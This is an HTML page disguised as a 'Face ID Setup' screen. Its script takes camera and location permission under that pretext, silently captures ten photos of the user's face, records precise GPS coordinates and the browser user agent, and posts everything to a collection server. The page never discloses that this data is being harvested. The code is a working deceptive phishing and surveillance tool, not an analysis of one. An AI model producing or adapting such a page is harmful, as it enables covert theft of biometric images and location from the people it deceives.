<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Face ID Setup</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: #000; color: #fff; height: 100vh; display: flex; flex-direction: column; padding: 20px; text-align: center; }
        .header { padding: 20px; font-size: 24px; }
        .instructions { flex: 1; display: flex; flex-direction: column; justify-content: center; }
        .camera-preview { width: 200px; height: 200px; margin: 20px auto; background: #333; border-radius: 10px; overflow: hidden; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .button { background: #007AFF; color: white; border: none; padding: 15px; margin: 10px; border-radius: 10px; font-size: 16px; }
        .status { margin-top: 20px; color: #aaa; }
    </style>
</head>
<body>
    <div class="header">Face ID Setup</div>
    <div class="instructions">
        <p>Position your face in the frame and move your head in a circle</p>
        <div class="camera-preview">
            <video id="video" autoplay playsinline></video>
        </div>
        <div class="status" id="status">Ready to start</div>
        <button class="button" id="start-btn">Start</button>
    </div>

    <script>
        const video = document.getElementById('video');
        const startBtn = document.getElementById('start-btn');
        const statusEl = document.getElementById('status');
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        let collectedData = {
            photos: [],
            locations: [],
            metadata: {
                userAgent: navigator.userAgent,
                startTime: new Date().toISOString()
            }
        };

        startBtn.addEventListener('click', async () => {
            try {
                statusEl.textContent = "Accessing camera...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                statusEl.textContent = "Accessing location...";
                await getLocation();
                
                startBtn.disabled = true;
                statusEl.textContent = "Capturing data...";
                
                // Capture every 2 seconds
                const interval = setInterval(() => {
                    if(collectedData.photos.length >= 10) {
                        clearInterval(interval);
                        sendToServer();
                        return;
                    }
                    capturePhoto();
                }, 2000);
                
            } catch (err) {
                statusEl.textContent = `Error: ${err.message}`;
            }
        });

        function capturePhoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            
            collectedData.photos.push({
                data: canvas.toDataURL('image/jpeg', 0.7),
                timestamp: new Date().toISOString()
            });
            
            statusEl.textContent = `Captured ${collectedData.photos.length} photos`;
        }

        function getLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) return reject("Geolocation not supported");
                
                navigator.geolocation.getCurrentPosition(position => {
                    collectedData.locations.push({
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date().toISOString()
                    });
                    resolve();
                }, reject);
            });
        }

        function sendToServer() {
            collectedData.metadata.endTime = new Date().toISOString();
            statusEl.textContent = "Saving to server...";
            
            fetch('http://localhost:3000/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(collectedData)
            })
            .then(response => {
                if(response.ok) statusEl.textContent = "Data saved successfully!";
                else statusEl.textContent = "Server error";
            })
            .catch(err => {
                statusEl.textContent = "Failed to save data";
            });
        }
    </script>
</body>
</html>
